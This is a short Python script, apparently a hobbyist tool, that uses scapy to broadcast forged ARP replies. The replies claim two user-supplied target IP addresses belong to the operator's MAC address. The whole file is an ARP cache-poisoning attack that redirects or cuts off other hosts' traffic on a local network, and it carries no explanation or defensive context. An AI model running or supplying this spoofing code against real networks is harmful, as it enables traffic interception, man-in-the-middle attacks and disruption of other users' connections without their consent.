from scapy.layers.l2 import Ether,ARP,sendp
import time



our_mac_address=input("Enter the our MAC: ")


target_ip=input("Enter the target IP: ")

broadcast="ff:ff:ff:ff:ff:ff"

arp_reply=Ether(dst=broadcast)/ARP(pdst=target_ip,hwdst=our_mac_address,psrc=target_ip,hwsrc=our_mac_address,op=2)

sendp(arp_reply,verbose=False)



time.sleep(1)



target_ip_2=input("Enter the second target IP: ")

broadcast_2="ff:ff:ff:ff:ff:ff"

arp_reply_2=Ether(dst=broadcast_2)/ARP(pdst=target_ip_2,hwdst=our_mac_address,psrc=target_ip_2,op=2)

sendp(arp_reply_2,verbose=False)
